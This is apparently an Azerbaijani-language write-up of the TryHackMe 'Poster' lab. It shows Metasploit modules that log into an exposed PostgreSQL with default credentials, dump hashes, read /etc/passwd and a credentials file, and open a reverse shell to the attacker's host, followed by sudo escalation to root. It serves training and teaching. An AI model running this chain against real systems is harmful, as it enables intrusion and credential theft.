# TryHackMe — Poster CTF Writeup

**Platforma:** TryHackMe  
**Lab:** [Poster](https://tryhackme.com/room/poster)  
**Çətinlik:** Orta  
**Hədəf IP:** 10.80.134.69  

---

## Xülasə

Bu CTF-də PostgreSQL-in açıq qalması və standart etimadnamələrin istifadəsi əsas giriş nöqtəsi oldu. PostgreSQL vasitəsilə sistemdə fayl oxuma, hash dump etmə və nəhayət RCE (Remote Code Execution) ilə shell əldə edildi. Daha sonra tapılan credentials ilə `alison` istifadəçisinin tam sudo icazəsindən istifadə edərək root əldə edildi.

---

## 1. Kəşfiyyat (Reconnaissance)

### Nmap Skan

```bash
nmap -sV -sC -A 10.80.134.69
```

**Nəticə:**

| Port | Xidmət | Versiyon |
|------|--------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.18 (Ubuntu) |
| 5432/tcp | PostgreSQL | 9.5.8 - 9.5.23 |

**Əhəmiyyətli tapıntılar:**
- Apache 2.4.18 — köhnə versiyon
- PostgreSQL 5432 portu açıqdır — bu nadir və təhlükəlidir
- Veb səhifə başlığı: **Poster CMS**

---

## 2. Veb Tədqiqat

`http://10.80.134.69/assets/` — **Directory Listing** açıqdır:

```
/assets/
├── css/
├── js/
├── sass/
└── webfonts/
```

Bu özlüyündə bir zəiflikdir — server konfiqurasiyası düzgün deyil.

---

## 3. PostgreSQL İstismarı

### 3.1 Default Etimadnamə Yoxlaması

```bash
msfconsole
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 10.80.134.69
run
```

**Tapılan etimadnamə:**
```
postgres : password
```

---

### 3.2 Versiyon Təsdiqi

```bash
use auxiliary/admin/postgres/postgres_sql
set RHOSTS 10.80.134.69
set USERNAME postgres
set PASSWORD password
set SQL select version()
run
```

**Nəticə:**
```
PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0) 5.4.0, 64-bit
```

---

### 3.3 Hash Dump

```bash
use auxiliary/scanner/postgres/postgres_hashdump
set RHOSTS 10.80.134.69
set USERNAME postgres
set PASSWORD password
run
```

**Tapılan hash-lar:**

| İstifadəçi | Hash |
|-----------|------|
| darkstart | md58842b99375db43e9fdf238753623a27d |
| poster | md578fb805c7412ae597b399844a54cce0a |
| postgres | md532e12f215ba27cb750c9e093ce4b5127 |
| sistemas | md5f7dbc0d5a06653e74da6b1af9290ee2b |
| ti | md57af9ac4c593e9e4f275576e13f935579 |
| tryhackme | md503aab1165001c8f8ccae31a8824efddc |

---

### 3.4 Fayl Oxuma — /etc/passwd

```bash
use auxiliary/admin/postgres/postgres_readfile
set RHOSTS 10.80.134.69
set USERNAME postgres
set PASSWORD password
set RFILE /etc/passwd
run
```

**Kritik tapıntı — faylın ilk sətri:**
```
#/home/dark/credentials.txt
```

Sistem `/home/dark/credentials.txt` faylına istinad edir!

**Əsas istifadəçilər:**
```
alison:x:1000:1000:/home/alison:/bin/bash
dark:x:1001:1001:/home/dark
postgres:x:109:117:/var/lib/postgresql:/bin/bash
```

---

### 3.5 Credentials Faylının Oxunması

```bash
set RFILE /home/dark/credentials.txt
run
```

**Tapılan:**
```
dark : qwerty1234#!hackme
```

---

### 3.6 Remote Code Execution — Shell Əldə Etmə

```bash
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS 10.80.134.69
set USERNAME postgres
set PASSWORD password
set LHOST <Kali_IP>
set LPORT 4444
run
```

**Shell əldə edildi:** `postgres@ubuntu`

---

## 4. Post-Exploitation

### 4.1 Shell Yaxşılaşdırma

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

### 4.2 Sistem Araşdırması

```bash
# alison-un home qovluğu
ls -la /home/alison/
cat /home/alison/.wget-hsts
```

`.wget-hsts` faylı:
```
gist.githubusercontent.com  0  0  1595981916  31536000
```

`alison` əvvəllər GitHub Gist-dən nəsə yükləyib.

---

### 4.3 Veb Konfiqurasiya Fayllarında DB Credentials

```bash
find /var/www/html -name "*.php" | xargs grep -l "password"
cat /var/www/html/config.php
```

---

### 4.4 SSH ilə Dark İstifadəçisinə Giriş

```bash
ssh dark@10.80.134.69
# Parol: qwerty1234#!hackme
```

---

### 4.5 Cron Job Kəşfi

```bash
cat /etc/crontab
```

```
* * * * * root cd /opt/ufw && bash ufw.sh
```

Hər dəqiqə `root` kimi `ufw.sh` icra olunur. Amma `/opt/ufw/ufw.sh` üzərində yazma icazəsi yox idi:

```
-rwxr-xr-x 1 root root 12 Jul 28 2020 ufw.sh
Permission denied
```

---

### 4.6 Alison İstifadəçisinə Keçid

```bash
su alison
sudo -l
```

**Nəticə:**
```
(ALL : ALL) ALL
```

`alison` tam sudo icazəsinə malikdir!

---

## 5. Privilege Escalation — Root

```bash
sudo su
# və ya
sudo bash
```

```bash
whoami
# root

cat /root/root.txt
cat /home/alison/user.txt
```

---

## 6. Hücum Xəritəsi

```
Nmap Skan
    ↓
PostgreSQL 5432 açıqdır
    ↓
Default credentials (postgres:password)
    ↓
Hash Dump + Fayl Oxuma
    ↓
/home/dark/credentials.txt → dark:qwerty1234#!hackme
    ↓
RCE → postgres shell
    ↓
su alison → sudo -l → (ALL:ALL) ALL
    ↓
sudo su → ROOT
```

---

## 7. İstifadə Olunan Metasploit Modulları

| Modul | Məqsəd |
|-------|--------|
| `auxiliary/scanner/postgres/postgres_login` | Default credentials tapmaq |
| `auxiliary/admin/postgres/postgres_sql` | SQL əmrləri icra etmək |
| `auxiliary/scanner/postgres/postgres_hashdump` | Hash-ları dump etmək |
| `auxiliary/admin/postgres/postgres_readfile` | Fayl oxumaq |
| `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` | RCE — shell almaq |

---

## 8. Öyrənilən Dərslər

| Zəiflik | Səbəb | Həll |
|---------|-------|------|
| PostgreSQL açıq port | Firewall yoxdur | Port 5432-ni xaricə bağla |
| Default credentials | `postgres:password` | Güclü parol istifadə et |
| Directory Listing | Apache konfiqurasiyası | `Options -Indexes` əlavə et |
| Credentials düz mətn faylda | `/home/dark/credentials.txt` | Şifrələnmiş saxlama |
| Həddindən artıq sudo icazəsi | `alison (ALL:ALL) ALL` | Ən az imtiyaz prinsipi |
| Köhnə Apache/PostgreSQL | 2018-ci il versiyaları | Sistemləri yeniləmək |

---

## 9. MITRE ATT&CK Xəritəsi

| Texnika | ID | İzah |
|---------|-----|------|
| Network Scanning | T1046 | Nmap ilə port skan |
| Valid Accounts | T1078 | Default credentials |
| Data from Local System | T1005 | Fayl oxuma |
| Command Execution | T1059 | PostgreSQL RCE |
| Sudo Escalation | T1548.003 | `sudo su` ilə root |

---

*Writeup təhsil məqsədli hazırlanmışdır. Yalnız icazəli sistemlərdə tətbiq edin.*
